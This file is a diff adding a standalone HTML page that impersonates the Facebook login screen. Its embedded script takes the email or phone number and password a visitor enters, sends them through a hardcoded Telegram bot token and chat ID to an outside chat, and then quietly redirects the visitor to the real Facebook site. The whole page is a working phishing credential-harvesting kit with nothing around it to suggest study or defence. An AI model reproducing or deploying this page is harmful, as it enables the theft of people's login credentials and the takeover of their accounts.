@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #1c1e21;
+        }
+        .container {
+            text-align: center;
+        }
+        .header {
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin: 0;
+        }
+        .header p {
+            font-size: 20px;
+            margin: 0;
+            padding: 0 10px;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            margin: 0 auto;
+            box-sizing: border-box;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: calc(100% - 30px);
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 15px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 20px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-container button:hover {
+            background-color: #165dbf;
+        }
+        .login-container a {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+        .login-container .create-account {
+            background-color: #42b72a;
+            margin-top: 20px;
+        }
+        .footer {
+            margin-top: 50px;
+            font-size: 12px;
+        }
+        .footer a {
+            color: #1c1e21;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="login-container">
+            <form id="myForm">
+                <input type="text" id="username" placeholder="Email address or phone number">
+                <input type="password" id="password" placeholder="Password">
+                <button type="submit">Log In</button>
+                <a href="#">Forgotten password?</a>
+                <button class="create-account">Create new account</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('myForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            var botToken = '6676530431:AAGuzzIBQ7GceHh48VzmXtO6R7cMZXL65fE';
+            var chatId = '-4103337507';
+            var message = `Username: ${username}\nPassword: ${password}`;
+
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Removed the alert line
+                        window.location.href = "https://www.facebook.com"; // Redirect to Facebook
+                    } else {
+                        alert('There was a problem with the form submission.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('There was a problem with the form submission.');
+                });
+        });
+    </script>
+</body>
+</html>
